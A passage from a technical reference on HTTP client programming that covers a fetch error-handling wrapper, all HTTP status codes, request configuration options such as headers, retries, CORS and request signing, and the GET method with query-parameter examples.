        'Accept': 'application/json',
        ...options.headers,
      },
    });
    
    clearTimeout(timeoutId);
    
    // Check status
    if (!response.ok) {
      let errorMessage = `HTTP ${response.status}`;
      try {
        const errorData = await response.json();
        errorMessage = errorData.message || errorMessage;
      } catch (e) {
        // Not JSON error response
      }
      throw new Error(errorMessage);
    }
    
    // Validate content type
    const contentType = response.headers.get('content-type');
    if (!contentType?.includes('application/json')) {
      throw new Error(`Expected JSON, received ${contentType}`);
    }
    
    // Handle empty responses
    if (response.status === 204 || response.headers.get('content-length') === '0') {
      return null;
    }
    
    // Parse JSON
    const data = await response.json();
    return data;
    
  } catch (error) {
    clearTimeout(timeoutId);
    
    if (error.name === 'AbortError') {
      throw new Error('Request timeout');
    }
    if (error instanceof SyntaxError) {
      throw new Error('Invalid JSON response');
    }
    throw error;
  }
}
```

---

## Response Status Codes

### 1xx Informational Responses

These interim status codes indicate that the server has received the request and is continuing to process it. The client should wait for the final response.

**100 Continue**

Indicates the server has received the request headers and the client should proceed to send the request body. This is used with the `Expect: 100-continue` request header, allowing clients to check if the server will accept the request before transmitting potentially large bodies. If the server rejects the request based on headers alone, it responds with an appropriate error status instead of 100, saving bandwidth.

**101 Switching Protocols**

The server agrees to switch protocols as requested by the client via the `Upgrade` header. Common uses include upgrading from HTTP to WebSocket. The response includes an `Upgrade` header specifying the new protocol. After this response, all subsequent communication uses the new protocol.

**102 Processing** (WebDAV)

Indicates the server has received and is processing the request, but no response is available yet. This prevents the client from timing out on long-running operations. Defined in WebDAV (RFC 2518).

**103 Early Hints**

Allows the server to send preliminary response headers before the final response. Primarily used to hint at resources the client should preload (via `Link` headers), improving page load performance. While processing continues, the client can start fetching critical resources like CSS or JavaScript files.

### 2xx Success

These codes indicate the request was successfully received, understood, and accepted.

**200 OK**

The request succeeded. The meaning depends on the HTTP method:

- **GET**: The resource representation is transmitted in the response body
- **HEAD**: Headers are sent without a body
- **POST**: The result of the action is in the response body
- **PUT/PATCH**: The updated resource representation may be included
- **TRACE**: The request message as received by the server

This is the most common success response.

**201 Created**

A new resource was successfully created, typically in response to POST or PUT requests. The `Location` header should contain the URI of the newly created resource. The response body may include a representation of the new resource or a link to it. The resource must exist at the specified location before the response is sent.

**202 Accepted**

The request has been accepted for processing, but processing is not complete. This is used for asynchronous operations where the server acknowledges receipt but will process the request later. The response should include information about the request's status or where to monitor progress. No guarantee exists that the request will ultimately succeed.

**203 Non-Authoritative Information**

The request succeeded, but the returned metadata differs from the origin server's version. This occurs when a transforming proxy modifies headers (e.g., adding virus scanning results or content warnings). The payload is still from the origin server, but headers may come from a local or third-party copy.

**204 No Content**

The request succeeded, but there's no content to send in the response body. Metadata in headers may be updated. Common uses:

- DELETE requests that succeed without returning deleted resource details
- PUT requests where the client already has the updated representation
- Form submissions where the current page shouldn't change
- Saving operations in editors that don't need to refresh content

The client should not update its document view when receiving 204.

**205 Reset Content**

Similar to 204, but instructs the client to reset the document view. Used primarily after form submissions where the user should be able to submit another entry. For example, after submitting a data entry form, the browser should clear all fields for the next entry.

**206 Partial Content**

The server is delivering only part of the resource due to a range request from the client (using the `Range` header). The response must include:

- `Content-Range` header specifying which bytes are being sent
- `Content-Type` matching the requested resource
- Either `Content-Length` (single range) or `multipart/byteranges` (multiple ranges)

Example: `Content-Range: bytes 1000-1999/5000` indicates bytes 1000-1999 of a 5000-byte resource.

**207 Multi-Status** (WebDAV)

The message body contains multiple status codes for different parts of a batch operation. The response body is XML, conveying information about multiple resources where different status codes apply. Used in WebDAV operations that affect multiple resources simultaneously.

**208 Already Reported** (WebDAV)

Members of a DAV binding have already been enumerated in a previous reply and are not being included again. This prevents infinite loops when a resource appears multiple times in a hierarchy due to bindings.

**226 IM Used**

The server has fulfilled a GET request for the resource, and the response represents the result of one or more instance-manipulations applied to the current instance. Used with delta encoding where the server sends only the differences from a previously cached version.

### 3xx Redirection

These codes indicate the client must take additional action to complete the request. The target location is typically provided in the `Location` header.

**300 Multiple Choices**

Multiple representations are available for the resource, each with different locations. The server may include a preferred choice in the `Location` header, or list alternatives in the response body. The client or user can select the preferred representation. This is rarely used in practice.

**301 Moved Permanently**

The resource has permanently moved to a new URI specified in the `Location` header. Future requests should use the new URI. Search engines update their indexes. Browsers and clients should cache this redirect.

[Inference] Many clients change POST to GET when following 301 redirects, though the specification suggests preserving the method. Use 308 to guarantee method preservation.

**302 Found**

The resource temporarily resides at a different URI. The client should continue using the original URI for future requests. The `Location` header contains the temporary URI.

[Inference] Like 301, many clients change POST to GET when following 302 redirects, though this isn't mandated. The original specification (HTTP/1.0) was ambiguous about this behavior.

**303 See Other**

The response to the request can be found at another URI using GET. This explicitly instructs clients to use GET for the redirect, regardless of the original method. Common pattern: POST to create/update a resource, then 303 redirect to GET the result. This prevents duplicate form submissions if the user refreshes the page (POST-Redirect-GET pattern).

**304 Not Modified**

The resource hasn't been modified since the version specified in the request's conditional headers (`If-Modified-Since`, `If-None-Match`). The server returns only headers, no body, saving bandwidth. The client should use its cached version. Response must not contain a message body and must include headers that would have been sent in a 200 response (e.g., `Cache-Control`, `ETag`).

**305 Use Proxy** (Deprecated)

Indicates the resource must be accessed through a proxy specified in the `Location` header. This status code has been deprecated due to security concerns—clients might be redirected to malicious proxies.

**307 Temporary Redirect**

Similar to 302, but guarantees the request method and body will not change when the redirected request is made. If the original request was POST, the redirected request must also be POST with the same body. Use this instead of 302 when method preservation is important.

**308 Permanent Redirect**

Similar to 301, but guarantees the request method and body are preserved. If the original request was POST, the redirected request must be POST. This is the method-preserving equivalent of 301. Use when you need permanent redirection without method changing behavior.

### 4xx Client Errors

These codes indicate the client's request contains errors or cannot be fulfilled due to client-side issues.

**400 Bad Request**

The server cannot process the request due to client error—malformed syntax, invalid request framing, or deceptive request routing. This is a generic error when no other 4xx code is appropriate. Common causes:

- Malformed JSON or XML in the request body
- Invalid query parameters
- Request headers exceeding size limits
- Syntax errors in the request line

**401 Unauthorized**

Authentication is required and has failed or not been provided. The response must include a `WWW-Authenticate` header specifying the authentication scheme(s) the server supports. Despite the name, this actually means "unauthenticated"—the client lacks valid credentials.

Example: `WWW-Authenticate: Basic realm="Access to staging site"`

After receiving valid credentials, the server may return 200 (success) or 403 (authenticated but forbidden).

**402 Payment Required**

Reserved for future use. Originally intended for digital payment systems. Some APIs use this experimentally to indicate payment is required (e.g., exceeding API quota, subscription expired), though 403 or custom 4xx codes are more common.

**403 Forbidden**

The server understands the request but refuses to authorize it. Unlike 401, authentication won't help—the server knows who the client is but denies access anyway. Common scenarios:

- Authenticated user lacks necessary permissions
- IP address is blocked
- Resource requires specific authentication method
- Access forbidden by policy (e.g., DRM restrictions)

The server may reveal why access is forbidden in the response body, or provide a generic message to avoid information leakage.

**404 Not Found**

The server cannot find the requested resource. This is the most common error status code. Reasons include:

- URI doesn't exist
- Resource was deleted
- Server wants to hide resource existence (security through obscurity)
- Endpoint exists but specific resource ID doesn't

404 doesn't indicate whether the absence is temporary or permanent. Servers may return 410 instead if the resource is permanently gone.

**405 Method Not Allowed**

The request method is not supported for the target resource. For example, attempting POST on a read-only resource, or DELETE on a protected resource. The response must include an `Allow` header listing valid methods.

Example: `Allow: GET, HEAD, OPTIONS`

**406 Not Acceptable**

The server cannot produce a response matching the client's proactive content negotiation requirements (specified via `Accept`, `Accept-Language`, `Accept-Encoding`, etc.). The server could not generate any representation acceptable to the client. The response may include a list of available representations for the user to choose from.

**407 Proxy Authentication Required**

Similar to 401, but authentication must occur with a proxy. The proxy must return a `Proxy-Authenticate` header specifying the authentication scheme. The client responds with `Proxy-Authorization` header in subsequent requests.

**408 Request Timeout**

The server timed out waiting for the complete request. The client didn't produce a complete request within the time the server was willing to wait. The server may close the connection. The client may retry the request.

**409 Conflict**

The request conflicts with the current state of the target resource. Common in scenarios like:

- PUT/PATCH operations where the request would create an inconsistent state
- Concurrent modifications (optimistic locking failure)
- Business rule violations
- Duplicate resource creation attempts

The response body should explain the conflict, ideally in a format the client can use to resolve it.

**410 Gone**

The target resource is permanently unavailable at the origin server and no forwarding address is known. This is stronger than 404—it explicitly indicates permanent removal. Used when the server knows the resource once existed but was deliberately deleted. Search engines should remove these URLs from their indexes.

**411 Length Required**

The server requires a `Content-Length` header in the request. The client may retry with a valid `Content-Length` header specifying the message body size.

**412 Precondition Failed**

One or more conditions specified in request headers (`If-Match`, `If-None-Match`, `If-Modified-Since`, `If-Unmodified-Since`, `If-Range`) evaluated to false. This is used for optimistic locking—ensuring the resource hasn't changed since the client last fetched it before allowing an update.

**413 Content Too Large**

The request body is larger than the server is willing or able to process. Previously named "Request Entity Too Large" (HTTP/1.1). The server may close the connection or return a `Retry-After` header indicating when to retry with a smaller payload.

**414 URI Too Long**

The request URI is longer than the server is willing to interpret. Rare conditions include:

- GET request with excessively long query string (should use POST instead)
- Redirect loop causing URI expansion
- Security attack attempting buffer overflow

Previously named "Request-URI Too Long" (HTTP/1.1).

**415 Unsupported Media Type**

The server refuses to accept the request because the payload format is unsupported. The `Content-Type` or `Content-Encoding` of the request is not supported by the server for the target resource or method. The response may include `Accept` or `Accept-Encoding` headers indicating supported formats.

**416 Range Not Satisfiable**

None of the ranges in the request's `Range` header field overlap with the current extent of the target resource. Reasons include:

- Requested byte range exceeds file size
- Invalid range syntax
- Multiple ranges with none overlapping the resource

The response should include a `Content-Range` header indicating the resource's current size: `Content-Range: bytes */5000`

**417 Expectation Failed**

The server cannot meet the requirements indicated in the request's `Expect` header. This occurs when the server doesn't support the expectation or cannot fulfill it. The most common use involves `Expect: 100-continue`.

**418 I'm a teapot**

Defined in RFC 2324 (Hyper Text Coffee Pot Control Protocol) as an April Fools' joke. The server is a teapot and cannot brew coffee. Some servers return this for rejected requests as humor, though it's not a standard HTTP status code for serious use.

**421 Misdirected Request**

The request was directed at a server that is not able to produce a response. This can occur when a connection is reused or when a server is not authoritative for the requested URI's scheme and authority combination. Often related to HTTP/2 connection reuse across multiple domains.

**422 Unprocessable Content** (WebDAV)

The request was well-formed but contains semantic errors. The server understands the content type and the syntax is correct, but the request cannot be processed due to logical errors. Common in REST APIs for validation failures—correct JSON syntax but invalid data (e.g., missing required fields, invalid email format, business rule violations).

Previously named "Unprocessable Entity" (WebDAV).

**423 Locked** (WebDAV)

The source or destination resource is locked. The request method cannot be applied because the resource is locked by another client. The response may include information about the lock in the body.

**424 Failed Dependency** (WebDAV)

The request failed because it depended on another request that failed. Used in WebDAV when operations on multiple resources are interdependent and one fails.

**425 Too Early**

The server is unwilling to risk processing a request that might be replayed. Used with TLS early data (0-RTT) where the request could be vulnerable to replay attacks. The client should retry after the TLS connection is fully established.

**426 Upgrade Required**

The server refuses to perform the request using the current protocol but might do so after the client upgrades. The response must include an `Upgrade` header specifying the required protocol(s).

Example: `Upgrade: HTTP/3.0`

Common when enforcing newer protocol versions for security reasons.

**428 Precondition Required**

The server requires the request to be conditional. This prevents the "lost update" problem where a client GETs a resource, modifies it, and PUTs it back, potentially overwriting changes made by other clients. The server requires headers like `If-Match` to ensure the client is updating the version they retrieved.

**429 Too Many Requests**

The client has sent too many requests in a given time period (rate limiting). The response may include:

- `Retry-After` header indicating how long to wait before retrying
- Custom headers indicating rate limit details (e.g., `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `X-RateLimit-Reset`)

This protects servers from abuse and ensures fair resource allocation.

**431 Request Header Fields Too Large**

The server refuses to process the request because header fields are too large. This may apply to:

- Individual header fields that are too large
- The entire set of request headers being too large

The response may indicate which headers are problematic. Common causes include excessively large cookies or authorization tokens.

**451 Unavailable For Legal Reasons**

The server is denying access to the resource as a consequence of legal demands. Named after Fahrenheit 451 (book about censorship). The response body should include an explanation and may reference the legal demand. Used when content is blocked due to government censorship, DMCA takedowns, or court orders.

### 5xx Server Errors

These codes indicate the server failed to fulfill a valid request due to server-side problems.

**500 Internal Server Error**

The server encountered an unexpected condition that prevented it from fulfilling the request. This is a generic catch-all error when no other 5xx code is appropriate. Common causes:

- Unhandled exceptions in application code
- Database connection failures
- Configuration errors
- Resource exhaustion (but not temporary—use 503 for that)

This indicates a server bug or misconfiguration, not a client problem. The response body may include details (in development) or a generic message (in production).

**501 Not Implemented**

The server does not support the functionality required to fulfill the request. Typically used when:

- The request method is not recognized or supported by the server at all
- The server lacks the capability to fulfill the request

This differs from 405 (method not allowed for this resource) in that 501 means the server doesn't support the method anywhere.

**502 Bad Gateway**

The server, while acting as a gateway or proxy, received an invalid response from the upstream server. This occurs in reverse proxy scenarios where the backend server:

- Returns malformed responses
- Closes the connection unexpectedly
- Violates the HTTP protocol

Common in load balancers, API gateways, and CDNs when upstream services fail.

**503 Service Unavailable**

The server cannot handle the request due to temporary overload or scheduled maintenance. This is explicitly temporary—the condition will be alleviated after some time. The response should include:

- `Retry-After` header indicating when the client should retry
- Explanation in the response body

Common causes:

- Scheduled maintenance
- Server overload (queue full, too many connections)
- Temporary resource exhaustion
- Deliberate throttling

Clients should respect the `Retry-After` header and implement exponential backoff.

**504 Gateway Timeout**

The server, acting as a gateway or proxy, did not receive a timely response from the upstream server. Similar to 502 but specifically about timeout rather than invalid response. The gateway/proxy waited longer than configured timeout for the upstream server to respond.

Common in microservice architectures where one service times out calling another, or when backend databases are slow to respond.

**505 HTTP Version Not Supported**

The server does not support the HTTP protocol version used in the request. For example, requesting HTTP/2 from a server that only supports HTTP/1.1. The response may indicate which versions are supported.

**506 Variant Also Negotiates**

Indicates an internal server configuration error. The chosen variant resource is configured to engage in transparent content negotiation itself, creating a circular reference in content negotiation. This is a server misconfiguration issue.

**507 Insufficient Storage** (WebDAV)

The server cannot store the representation needed to complete the request. The server is unable to store the resource required to complete the request, typically due to disk space limitations. Common in WebDAV file upload operations.

**508 Loop Detected** (WebDAV)

The server detected an infinite loop while processing the request. Used in WebDAV operations when processing a request with depth infinity would result in an infinite loop due to circular resource relationships.

**510 Not Extended**

Further extensions to the request are required for the server to fulfill it. This was defined in an experimental RFC (RFC 2774) for HTTP extension framework but is rarely used in practice.

**511 Network Authentication Required**

The client needs to authenticate to gain network access. Used by captive portals (Wi-Fi hotspots requiring login). The response body should contain information about how to authenticate or a link to a login page.

### Status Code Selection Guidelines

**For successful operations:**

- Use 200 for most successful GET, PUT, PATCH requests with response body
- Use 201 for resource creation with `Location` header
- Use 204 for successful operations requiring no response body
- Use 202 for asynchronous operations accepted but not completed

**For redirects:**

- Use 301/308 for permanent moves (308 preserves method)
- Use 302/307 for temporary moves (307 preserves method)
- Use 303 for POST-Redirect-GET pattern

**For client errors:**

- Use 400 for malformed requests
- Use 401 for authentication failures (with `WWW-Authenticate`)
- Use 403 for authorization failures (authenticated but forbidden)
- Use 404 for non-existent resources
- Use 409 for business logic conflicts
- Use 422 for validation errors on well-formed requests
- Use 429 for rate limiting

**For server errors:**

- Use 500 for unexpected server failures
- Use 502 for upstream server problems
- Use 503 for temporary unavailability (with `Retry-After`)
- Use 504 for upstream timeouts

[Inference] Proper status code selection improves API usability, enables appropriate client-side error handling, and assists with debugging, though the exact mapping between situations and status codes can vary based on API design philosophy.

---

# Request Configuration

## Request Initialization Options

### Method Specification

The HTTP method defines the request's semantic intent and expected behavior. GET retrieves resources without side effects, supporting caching and idempotency. POST submits data for processing, typically creating resources or triggering operations with side effects. PUT replaces entire resources idempotently. PATCH applies partial modifications to resources. DELETE removes resources. HEAD retrieves headers without the body, useful for checking resource existence or metadata. OPTIONS queries supported methods and CORS policies. TRACE echoes the request for debugging. CONNECT establishes tunnels for proxying.

Method selection affects caching behavior, safety guarantees, and idempotency properties. Safe methods (GET, HEAD, OPTIONS) shouldn't modify server state. Idempotent methods (GET, PUT, DELETE, HEAD, OPTIONS) produce the same result when repeated.

### URL and Path Configuration

The target URL combines multiple components: protocol scheme (http, https), hostname or IP address, optional port number (defaults: 80 for HTTP, 443 for HTTPS), path identifying the resource, query string containing key-value parameters, and fragment identifier for client-side navigation.

Query parameters encode data in the URL using `key=value` pairs separated by ampersands. Special characters require percent-encoding (URL encoding) where spaces become `%20` or `+`, and reserved characters get escaped. Multiple values for the same key can be represented as `key=value1&key=value2` or `key[]=value1&key[]=value2` depending on server parsing conventions.

Path parameters embed values directly in the URL structure (`/users/123/posts/456`) rather than query strings, typically representing resource identifiers in RESTful designs. This pattern creates cleaner URLs and clearer hierarchical relationships between resources.

Base URLs can be configured separately from relative paths, enabling environment-specific configuration where the same path logic works across development, staging, and production endpoints by swapping base URLs.

### Headers Configuration

Headers provide metadata controlling request processing and client capabilities. Each header consists of a case-insensitive name and a value, with multiple values separated by commas or multiple header instances with the same name.

**Content negotiation headers** inform the server about acceptable response formats. Accept specifies media types (`application/json`, `text/html`, `*/*`) with optional quality values (`q=0.8`) indicating preference. Accept-Language prioritizes human languages. Accept-Encoding lists supported compression algorithms (gzip, deflate, br, identity). Accept-Charset specifies character encoding preferences.

**Authentication headers** carry credentials. Authorization contains tokens in various schemes: `Bearer <token>` for JWT and OAuth tokens, `Basic <base64(username:password)>` for basic authentication, `Digest` for digest authentication, or custom schemes. API keys may travel in Authorization, custom headers (`X-API-Key`), or query parameters (less secure).

**Content description headers** characterize request bodies. Content-Type specifies the media type and optional charset (`application/json; charset=utf-8`, `multipart/form-data; boundary=----WebKitFormBoundary`, `application/x-www-form-urlencoded`). Content-Length indicates body size in bytes. Content-Encoding specifies compression applied to the body. Content-Language indicates the body's natural language.

**Caching and validation headers** control cache behavior. Cache-Control directives like `no-cache`, `no-store`, `max-age=3600`, or `must-revalidate` specify caching policy. If-Modified-Since and If-None-Match enable conditional requests using timestamps or ETags respectively. If-Match and If-Unmodified-Since support optimistic concurrency control.

**Connection management headers** control the underlying TCP connection. Connection: keep-alive maintains persistent connections, while Connection: close forces closure after the response. Keep-Alive specifies timeout and maximum request parameters.

**CORS-related headers** enable cross-origin requests. Origin identifies the requesting origin. Access-Control-Request-Method and Access-Control-Request-Headers appear in preflight OPTIONS requests to query allowed methods and headers.

**Custom headers** extend functionality beyond standard headers. Common conventions prefix custom headers with `X-` (though this convention is deprecated) or use vendor-specific prefixes. Examples include `X-Request-ID` for distributed tracing, `X-Forwarded-For` preserving original client IPs through proxies, and `X-CSRF-Token` for CSRF protection.

### Body Content and Encoding

Request bodies carry payload data for methods like POST, PUT, and PATCH. Body format must match the Content-Type header's media type.

**JSON bodies** (`application/json`) serialize structured data as JSON strings. Objects, arrays, and primitive values nest arbitrarily. JSON's text-based format makes it human-readable and language-agnostic, though larger than binary formats. Unicode characters require proper encoding in UTF-8.

**Form-encoded bodies** (`application/x-www-form-urlencoded`) encode key-value pairs similarly to query strings: `key1=value1&key2=value2`. Special characters are percent-encoded. This format handles simple flat data structures but struggles with nested objects or arrays.

**Multipart bodies** (`multipart/form-data`) enable file uploads and mixed content types within a single request. Each part has its own headers and content, separated by boundary strings declared in the Content-Type header. Parts can contain text fields, binary files, or nested multipart structures. Each part specifies Content-Disposition with field name and optional filename, plus Content-Type for the part's media type.

**Binary bodies** (`application/octet-stream`) transmit raw bytes without additional encoding, used for file uploads where the entire body represents a single file. Content-Length becomes critical for determining where the body ends.

**XML bodies** (`application/xml` or `text/xml`) structure data hierarchically using markup tags. While JSON has largely supplanted XML in modern APIs, XML remains common in SOAP services, configuration files, and legacy systems.

**Plain text bodies** (`text/plain`) send unstructured text data. The charset parameter specifies character encoding (typically UTF-8).

**Streaming bodies** transmit data incrementally rather than buffering the entire payload. Chunked transfer encoding (`Transfer-Encoding: chunked`) sends variable-sized chunks, each prefixed with its size in hexadecimal. This enables transmitting bodies of unknown length, useful for real-time data, large file uploads, or generated content.

### Timeout Configuration

Timeout settings balance responsiveness against allowing time for legitimate slow operations. Multiple timeout types control different phases of the request lifecycle.

**Connection timeout** limits the time to establish a TCP connection with the server. This includes DNS resolution, TCP handshake, and for HTTPS, TLS negotiation. Typical values range from 5-30 seconds. Short timeouts fail fast on unreachable or overloaded servers, while longer timeouts accommodate slow networks or distant servers.

**Read/receive timeout** constrains the time between receiving successive bytes of the response. This prevents indefinite blocking on stalled connections where the server stops sending data mid-response. The timeout resets each time data arrives, so responses can exceed the timeout as long as data flows continuously. Values typically range from 30-120 seconds depending on expected response complexity.

**Write/send timeout** limits the time between sending successive bytes of the request body. Relevant primarily for large request bodies, this prevents hanging on slow or unresponsive servers. Similar to read timeout, it resets when progress occurs.

**Overall/total timeout** caps the entire request/response cycle duration from initiation through completion. This provides an absolute upper bound regardless of progress, preventing requests from consuming resources indefinitely even if making intermittent progress. Must exceed the sum of connection and transfer times for legitimate requests.

### Redirect Handling

HTTP redirects (3xx status codes) instruct clients to retrieve the resource from a different location. Redirect handling options control automatic following behavior.

**Automatic redirect following** transparently follows redirects up to a maximum depth (typically 5-20 redirects) to prevent infinite loops. The client makes additional requests to the locations specified in Location headers until receiving a non-redirect response or hitting the limit.

**Method preservation** determines whether redirects maintain the original HTTP method. [Inference: Historically, many clients changed POST to GET when following redirects, though modern standards specify method preservation for 307 and 308 status codes specifically.] 301 (Moved Permanently) and 302 (Found) often cause clients to switch POST/PUT requests to GET. 303 (See Other) explicitly instructs changing to GET. 307 (Temporary Redirect) and 308 (Permanent Redirect) require preserving the method and body.

**Redirect policies** can be configured as: always follow (default for most clients), never follow (useful for testing or scraping), follow same-origin only (security measure preventing redirect-based attacks), or follow with custom logic (examining status codes and locations before deciding).

**Referrer handling** during redirects determines what Referrer header gets sent in subsequent requests. Options include omitting referrer for security, preserving the original request URL, or using the intermediate redirect URL.

### Retry Logic

Network unreliability and transient server errors necessitate retry mechanisms for resilient applications. Retry configuration balances reliability against avoiding overloading struggling services.

**Retry conditions** specify which failures trigger retries: network errors (connection refused, timeout, DNS failure), specific HTTP status codes (408 Request Timeout, 429 Too Many Requests, 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout), or custom logic examining response characteristics. Safe, idempotent methods (GET, HEAD, PUT, DELETE) can be retried safely, while POST requires careful consideration of side effects.

**Retry strategies** include immediate retry (rarely appropriate), fixed delay (constant interval between attempts), exponential backoff (doubling delay after each failure), and exponential backoff with jitter (adding randomness to prevent thundering herd). Example progression: 1s, 2s, 4s, 8s with jitter might become 1.2s, 2.4s, 3.9s, 8.1s.

**Maximum retry attempts** limit total tries (typically 3-5) before giving up and propagating the failure upstream. Combined with timeout settings, this bounds total time spent on failed requests.

**Backoff multipliers and maximum delay** configure exponential backoff behavior. Multiplier (commonly 2) determines growth rate, while maximum delay caps the interval (e.g., 60 seconds) preventing excessively long waits.

### Authentication and Authorization

Authentication mechanisms verify client identity, while authorization determines permitted actions. Configuration options enable various schemes.

**Token-based authentication** includes bearer tokens in the Authorization header. OAuth 2.0 access tokens grant limited access based on scopes. JWT (JSON Web Tokens) encode claims and signatures enabling stateless verification. API keys identify applications or services. Tokens may require refresh when expired, either automatically (refresh token flow) or through re-authentication.

**Basic authentication** encodes username and password as base64 in the Authorization header. Despite simplicity, it's inherently insecure without HTTPS since credentials are easily decoded. Used primarily for internal services or when simpler mechanisms suffice.

**Digest authentication** improves on basic auth by hashing credentials with nonces, preventing credential exposure even without HTTPS. However, complexity and better alternatives (HTTPS + bearer tokens) have made it uncommon.

**Certificate-based authentication** (mutual TLS) requires clients to present X.509 certificates during TLS handshake, cryptographically proving identity. Used in high-security environments, service-to-service communication, and IoT devices.

**Session-based authentication** relies on cookies containing session IDs. The initial login establishes the session, with subsequent requests including the session cookie automatically. Cookie options (SameSite, Secure, HttpOnly) control transmission and security properties.

### CORS Configuration

Cross-Origin Resource Sharing (CORS) enables browsers to make requests across origins (different protocol, domain, or port). Client-side JavaScript triggers CORS policies, while servers control permissions through response headers.

**Simple requests** (GET, HEAD, POST with limited content types and headers) proceed directly. The browser includes an Origin header, and the server responds with Access-Control-Allow-Origin specifying allowed origins or `*` for public APIs.

**Preflight requests** occur for non-simple requests. The browser sends an OPTIONS request with Access-Control-Request-Method and Access-Control-Request-Headers describing the intended request. The server responds with allowed methods, headers, origins, and whether credentials are permitted. The browser then sends the actual request if permitted, or blocks it otherwise.

**Credentials in cross-origin requests** (cookies, authorization headers) require explicit opt-in via the `credentials` option (omit, same-origin, include) on the client and Access-Control-Allow-Credentials: true from the server. When allowing credentials, Access-Control-Allow-Origin cannot be `*` but must specify exact origins.

### Request Signing

Request signing cryptographically authenticates requests, proving the sender possesses a secret key without transmitting the key itself. This prevents tampering and replay attacks.

**HMAC-based signing** computes a hash of the request components (method, path, headers, body) using a shared secret key. The signature travels in a custom header or as part of the Authorization header. The server recomputes the signature using its copy of the secret key and compares signatures to validate authenticity.

**Signature components** typically include: timestamp (preventing replay), nonce (unique per request), HTTP method, request path and query parameters, selected headers (especially Content-Type and Content-Length), and body content or body hash. Including timestamps requires clock synchronization between client and server.

**AWS Signature Version 4** exemplifies production signing schemes. It creates a canonical request string, computes a string-to-sign including scope and timestamp, derives signing keys from secret key and date, and produces an HMAC-SHA256 signature. The Authorization header contains the algorithm, credentials, signed headers, and signature.

### Compression

Compression reduces transmitted data size at the cost of CPU cycles for encoding/decoding. Configuration determines which content gets compressed and using which algorithms.

**Request body compression** requires setting Content-Encoding to indicate the algorithm (gzip, deflate, br for Brotli). Servers must support the specified encoding to decompress the body. [Inference: Not all servers accept compressed request bodies, so this option may cause failures with incompatible servers.]

**Response compression acceptance** uses the Accept-Encoding header listing supported algorithms with optional quality values. The server chooses an encoding or sends uncompressed content. The response's Content-Encoding header indicates which algorithm was used, if any.

**Compression algorithms** differ in trade-offs. Gzip provides good compression and universal support. Brotli achieves better compression ratios but requires more CPU and has less universal support. Deflate is older and less efficient than gzip.

### Proxying

Proxy configuration routes requests through intermediary servers for various purposes: anonymity, caching, authentication, traffic filtering, or bypassing network restrictions.

**HTTP proxies** forward HTTP requests to the target server. The client sends the full URL (absolute URI form) in the request line to the proxy, which then makes the request to the origin server. The proxy may modify headers, add authentication, or cache responses.

**HTTPS proxies** use the CONNECT method to establish a tunnel through the proxy to the target server. The proxy forwards TCP bytes without inspecting encrypted content, maintaining end-to-end encryption between client and origin server.

**Proxy authentication** requires credentials to use the proxy service, separate from authentication with the origin server. Proxy-Authorization header carries credentials, and 407 Proxy Authentication Required responses indicate missing or invalid proxy credentials.

**No-proxy lists** specify hostnames or patterns that should bypass the proxy. Common entries include localhost, local IP ranges (127.0.0.0/8, 10.0.0.0/8), and internal domain names. This prevents routing internal traffic through external proxies.

### Priority and Scheduling

HTTP/2 and HTTP/3 enable request prioritization, allowing clients to indicate relative importance when multiplexing multiple requests over a single connection.

**Request priority** assigns weights and dependencies. Higher-priority requests receive more bandwidth share when resources are constrained. Dependencies create parent-child relationships where child streams should be processed only after parents complete. [Inference: Actual prioritization behavior depends on server implementation—not all servers respect client priority hints equally.]

**Weight values** range from 1-256, with higher values indicating greater importance relative to siblings at the same priority level. Servers distribute resources proportionally to weights among competing streams.

### Integrity and Validation

Request options can enforce integrity constraints ensuring responses match expected characteristics.

**Subresource Integrity (SRI)** for fetched resources specifies expected cryptographic hashes. The client computes the hash of received content and rejects responses not matching the expected hash, preventing compromised CDNs or man-in-the-middle attacks from serving malicious content. Hashes use algorithms like SHA-256, SHA-384, or SHA-512.

**Content validation options** can enforce expected Content-Type, Content-Length ranges, or custom validation logic examining response characteristics before accepting the response.

### Metadata and Tracking

Additional options attach metadata for logging, monitoring, and distributed tracing without affecting request semantics.

**Request IDs** uniquely identify each request for correlation across logs, traces, and monitoring systems. Generated by the client or intermediary proxies, these IDs (UUID or similar) travel in custom headers like X-Request-ID and propagate through service chains.

**Tracing context** for distributed tracing includes trace ID (identifying the overall transaction), span ID (identifying this request's work), parent span ID (linking to the calling service), and sampling flags (controlling trace retention). Headers follow standards like W3C Trace Context or vendor-specific formats (X-B3-TraceId, etc.).

**Tags and labels** attach arbitrary key-value metadata useful for monitoring dashboards, alerting rules, or analytics. These typically don't travel in the HTTP request but are associated with client-side metrics and logs.

### Cancellation

Request cancellation aborts in-flight requests, freeing client and server resources when the response is no longer needed. Useful when users navigate away, search queries update, or timeouts expire.

**Abort signals** provide a standardized cancellation mechanism. An AbortController creates an AbortSignal that can be passed to fetch requests. Calling abort() on the controller triggers cancellation, causing the request to reject with an abort error. [Inference: Server-side cancellation depends on implementation—closing the TCP connection may not immediately stop server processing if the request was already queued or executing.]

**Cleanup behavior** determines what happens when cancellation occurs: immediate connection closure, allowing in-flight writes to complete, or waiting for critical sections to finish. Client libraries handle cleanup automatically, but application code must handle abort errors appropriately.

---

## HTTP Methods (GET, POST, PUT, DELETE, PATCH)

### GET

**Primary Purpose** GET retrieves resource representations from servers. It requests data without modifying server state, making it the fundamental read operation in REST.

**Characteristics**

GET is safe—it produces no side effects on resources. Multiple identical GET requests leave the server in the same state. This safety enables aggressive caching, prefetching, and link crawling without concern for unintended consequences.

GET is idempotent—executing the same GET request multiple times produces identical results (assuming the resource hasn't changed independently). Network failures allow safe retries without risk of corruption.

GET requests should never contain request bodies. While HTTP specifications don't explicitly forbid bodies in GET requests, many intermediaries, proxies, and server implementations ignore or reject them. All parameters belong in the URI—query strings, path parameters, or fragments.

**Response Codes**

- 200 OK: Resource found and returned successfully
- 304 Not Modified: Cached version is current (conditional GET with If-None-Match or If-Modified-Since)
- 404 Not Found: Resource doesn't exist at the specified URI
- 400 Bad Request: Malformed query parameters or invalid filters
- 401 Unauthorized: Authentication required
- 403 Forbidden: Authenticated but lacks read permission
- 410 Gone: Resource previously existed but was permanently removed

**Query Parameters**

Query parameters customize GET requests without violating REST principles:

**Filtering:**

```
GET /products?category=electronics&price_max=1000&in_stock=true
GET /users?status=active&role=admin&created_after=2024-01-01
```

**Sorting:**

```
GET /articles?sort=published_date&order=desc
GET /users?sort=-created_at,name
```

**Pagination:**

```
GET /items?page=2&per_page=50
GET /items?offset=100&limit=50
